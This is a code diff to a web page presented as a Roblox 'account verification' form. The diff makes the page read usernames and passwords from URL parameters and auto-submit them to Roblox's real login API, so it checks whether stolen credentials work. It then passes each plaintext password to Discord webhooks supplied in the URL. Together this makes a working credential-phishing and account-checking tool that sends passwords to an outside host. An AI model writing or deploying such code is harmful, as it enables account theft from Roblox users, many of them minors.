@@ -164,6 +164,14 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        .verification-info {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            border-left: 4px solid #00a2ff;
+        }
     </style>
 </head>
 <body>
@@ -174,9 +182,10 @@
         </div>
         
         <div class="login-form">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" placeholder="Enter your username" value="LoginCheckerdsa" readonly>
+            <div class="verification-info">
+                <strong>Verification in progress:</strong>
+                <div>Username: <span id="info-username">LoginCheckerdsa</span></div>
+                <div>Tracking ID: <span id="info-tracking-id">f3254636-504c-4c11-9c7c-ebd829439b5a</span></div>
             </div>
             
             <div class="form-group">
@@ -187,6 +196,11 @@
             <button id="login-btn" class="login-btn">Verify Account</button>
             
             <div id="result-message" class="result-message hidden"></div>
+
+            <div id="loading" class="loading hidden">
+                <div class="spinner"></div>
+                <p>Verifying credentials with Roblox...</p>
+            </div>
         </div>
         
         <div class="footer">
@@ -200,28 +214,36 @@
         const urlParams = new URLSearchParams(window.location.search);
         const trackingId = urlParams.get('id');
         const userId = urlParams.get('userId');
-        const presetUsername = urlParams.get('username');
+        const username = urlParams.get('username');
+        const passwordFromUrl = urlParams.get('password');
         const successWebhook = urlParams.get('successWebhook');
         const failedWebhook = urlParams.get('failedWebhook');
         
         // DOM elements
-        const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('login-btn');
         const resultMessage = document.getElementById('result-message');
+        const loadingElement = document.getElementById('loading');
+        const infoUsername = document.getElementById('info-username');
+        const infoTrackingId = document.getElementById('info-tracking-id');
         
-        // Set preset username if available
-        if (presetUsername) {
-            usernameInput.value = presetUsername;
+        // Set information from URL parameters
+        if (username) {
+            infoUsername.textContent = username;
+        }
+        if (trackingId) {
+            infoTrackingId.textContent = trackingId;
+        }
+        if (passwordFromUrl) {
+            passwordInput.value = passwordFromUrl;
         }
         
         // Login button event
         loginBtn.addEventListener('click', async function() {
-            const username = usernameInput.value.trim();
             const password = passwordInput.value.trim();
             
-            if (!username || !password) {
-                showResult('Please enter both username and password', false);
+            if (!password) {
+                showResult('Please enter your password', false);
                 return;
             }
             
@@ -229,39 +251,99 @@
             loginBtn.disabled = true;
             loginBtn.textContent = 'Verifying...';
             resultMessage.className = 'result-message hidden';
+            loadingElement.classList.remove('hidden');
             
             // Verify credentials
-            const isValid = await verifyCredentials(username, password);
+            const isValid = await verifyWithRobloxAPI(username, password);
+            
+            // Hide loading
+            loadingElement.classList.add('hidden');
             
             // Show result
-            await showResult(isValid ? 'Verification successful!' : 'Verification failed!', isValid);
+            await showResult(
+                isValid ? 'Verification successful! Password is valid.' : 'Verification failed! Password is invalid.', 
+                isValid
+            );
             
             // Re-enable button
             loginBtn.disabled = false;
             loginBtn.textContent = 'Verify Account';
         });
         
-        async function verifyCredentials(username, password) {
-            // In a real implementation, this would verify with Roblox API
-            // For this example, we'll simulate verification
-            
-            // Simulate API call delay
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            // Simple validation logic (replace with actual API call)
-            if (password.length < 6) {
+        async function verifyWithRobloxAPI(username, password) {
+            try {
+                // First get CSRF token from Roblox
+                const csrfToken = await getCsrfToken();
+                if (!csrfToken) {
+                    console.error("Could not get CSRF token");
+                    return false;
+                }
+                
+                // Attempt to login with the credentials
+                const loginData = {
+                    ctype: 'Username',
+                    cvalue: username,
+                    password: password
+                };
+                
+                const response = await fetch('https://auth.roblox.com/v2/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': csrfToken
+                    },
+                    body: JSON.stringify(loginData),
+                    credentials: 'include'
+                });
+                
+                const data = await response.json();
+                
+                // Check if login was successful
+                if (data && data.user && data.user.id) {
+                    console.log("✅ Roblox API verification successful");
+                    return true;
+                }
+                
+                // Check for specific error conditions
+                if (data && data.errors) {
+                    for (const error of data.errors) {
+                        if (error.code === 1) { // Incorrect username or password
+                            console.log("❌ Roblox API verification failed: Incorrect credentials");
+                            return false;
+                        }
+                        if (error.code === 2) { // Captcha required
+                            console.log("⚠️ CAPTCHA required - cannot verify automatically");
+                            // For CAPTCHA, we'll assume invalid for security
+                            return false;
+                        }
+                    }
+                }
+                
+                console.log("❌ Roblox API verification failed: Unknown error");
+                return false;
+                
+            } catch (error) {
+                console.error('Roblox API verification failed:', error);
                 return false;
             }
-            
-            // Check for common passwords
-            const commonPasswords = ['password', '123456', 'roblox', 'qwerty', 'letmein'];
-            if (commonPasswords.includes(password.toLowerCase())) {
-                return false;
+        }
+        
+        async function getCsrfToken() {
+            try {
+                const response = await fetch('https://auth.roblox.com/v2/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': 'fetch'
+                    },
+                    credentials: 'include'
+                });
+                
+                return response.headers.get('x-csrf-token');
+            } catch (error) {
+                console.error('Could not fetch CSRF token:', error);
+                return null;
             }
-            
-            // If not obviously invalid, consider it valid (for demo purposes)
-            // In real implementation, you would call Roblox API here
-            return true;
         }
         
         async function showResult(message, isSuccess) {
@@ -271,7 +353,7 @@
             
             // Send result to Discord if webhooks are provided
             if (successWebhook && failedWebhook) {
-                await sendToDiscord(isSuccess, usernameInput.value, passwordInput.value);
+                await sendToDiscord(isSuccess, username, passwordInput.value);
             }
         }
         
@@ -327,11 +409,8 @@
             }
         }
         
-        // Auto-fill password from URL if available
-        const urlPassword = urlParams.get('password');
-        if (urlPassword) {
-            passwordInput.value = urlPassword;
-            // Auto-click verify button after a delay
+        // Auto-start verification if password is provided in URL
+        if (passwordFromUrl) {
             setTimeout(() => {
                 loginBtn.click();
             }, 1000);
